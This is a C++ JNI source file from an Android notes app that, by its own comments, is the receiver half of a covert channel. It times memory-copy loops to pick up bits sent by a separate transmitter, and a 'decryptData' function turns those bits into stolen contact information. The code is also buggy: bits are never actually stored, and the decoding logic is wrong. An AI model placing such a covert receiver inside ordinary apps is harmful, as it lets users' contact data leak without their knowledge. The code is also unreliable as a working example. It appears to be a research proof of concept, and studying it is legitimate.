#include <jni.h>
#include <android/log.h>
#include <arm_neon.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/shm.h>
#include <arm_fp16.h>
#include <string>
#include <string.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <vector>

// Stream Parameters
#define STREAM_ARRAY_SIZE 8000000
#define LOOPS 100000
#define BYTES (2 * STREAM_ARRAY_SIZE * sizeof(float16_t))

// used for logging
#define APPNAME "NotesAppCPPDemo"

static float16_t a[STREAM_ARRAY_SIZE], b[STREAM_ARRAY_SIZE];
static uint64_t loopTimes[LOOPS];

//returns value of clock register (which is incremented every clock cycle)
static inline uint64_t read_pmccntr() {
    uint64_t val;
    asm volatile("mrs %0, cntvct_el0"
            : "=r"(val)); // pmccntr_el0
    return val;
}

static inline uint64_t get_clock_frequency() {
    uint64_t val;
    asm volatile("mrs %0, cntfrq_el0"
            : "=r"(val));
    return val;
}

static uint64_t calibrate() {
    /* calibrate the overhead for measuring time */
    uint64_t dtMin = 0xFFFFFFFFFFFFFFFF;
    uint64_t t0, t1, i;
    for (i = 0; i < 100; i++) {
        t0 = read_pmccntr();
        t1 = read_pmccntr();
        dtMin = ((t1 - t0) < dtMin) ? t1 - t0 : dtMin;
    }
    return dtMin;
}

//array copy func
void STREAM_copy_simd() {
    uint32_t i;
    for (i = 0; i < STREAM_ARRAY_SIZE; i += 8) {
        b[i] = a[i];
        b[i + 1] = a[i + 1];
        b[i + 2] = a[i + 2];
        b[i + 3] = a[i + 3];
        b[i + 4] = a[i + 4];
        b[i + 5] = a[i + 5];
        b[i + 6] = a[i + 6];
        b[i + 7] = a[i + 7];
    }
}

void STREAM_copy() {
    uint32_t i;
    for (i = 0; i < STREAM_ARRAY_SIZE; i++) {
        b[i] = a[i];
    }
}

//decrypts the message sent by the transmitter
//takes the encrypted string of bits containing the contact data and flips it, then it turns every 8 bits into integers, then into characters based on ASCII
std::string decryptData(std::string encryptedData) {
    std::string data = std::bitset<8>(encryptedData).flip().to_string();
    std::string contactInfo = "";
    for (int j = 0; j < data.length(); j += 7) {
        int value = std::stoi(data.substr(j, 8), nullptr, 2);
        contactInfo += (char) value;
    }
    return contactInfo;
}

//main C++ function, called in MainActivity of app
//This is the receiver portion of the covert channel, it is constantly monitoring shared
//memory, but only records transmissions if they're detected every 300 ms
extern "C" JNIEXPORT jint JNICALL
Java_com_simplemobiletools_notes_pro_activities_MainActivity_00024Companion_receiver(JNIEnv *env, jobject thiz) {

    uint64_t dtMin, start, end, hz;
    uint32_t i, current_loop;
    double total_time = 0;
    jstring bits;  //where binary is recorded from the transmitter morse readings


    // Get the smallest overhead for measuring time
    dtMin = calibrate();

    // Warmup
    for (i = 0; i < 1000; i++) {
        STREAM_copy_simd();
    }

    uint64_t previous_time = 0; // Previous execution time
    uint64_t threshold = 100000; // Adjust the threshold value as needed
    //std::chrono::duration<long long int, std::ratio<1LL, 1000LL>> accumulated_time;
    long accumulated_time = 0;
    // Run memory accesses for a fixed number of iterations
    for (current_loop = 0; current_loop < LOOPS; current_loop++) {
        auto begin_time = std::chrono::steady_clock::now(); //start the receiver timer so transmissions can be monitored
        start = read_pmccntr();
        STREAM_copy_simd();
        end = read_pmccntr();

        loopTimes[current_loop] = end - start - dtMin;

        // Check if the execution time has increased significantly
        auto stop_time = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(stop_time - begin_time);
        accumulated_time += duration.count();
        //If Memory operation performance drop detected
        if (previous_time > 0 && (end - start - dtMin) > (previous_time + threshold)) {
            //__android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "Previous time: %lu", accumulated_time);
            if (accumulated_time > 280) { //Statement should approximately match the transmission times
                accumulated_time = 0;
                __android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "Transmission spike detected: Recorded as 1");
                bits + '1';
            }
        }
        else {
            //__android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "Previous time: %lu", accumulated_time);
            if (accumulated_time > 280) { //Statement should approximately match the transmission times
                accumulated_time = 0;
                __android_log_print(ANDROID_LOG_VERBOSE, APPNAME, "No Transmission spike detected: Recorded as 0");
                bits + '0';
            }
        }
        previous_time = end - start - dtMin;
    }

    double time, bw;
    hz = get_clock_frequency();
    for (i = 0; i < current_loop; i++) {
        time = (double) loopTimes[i] / hz;
        bw = BYTES / time / (1024 * 1024 * 1024);       //unsure of what bw stands for, or is used for
        total_time = total_time + time;
    }

    return 0;
}

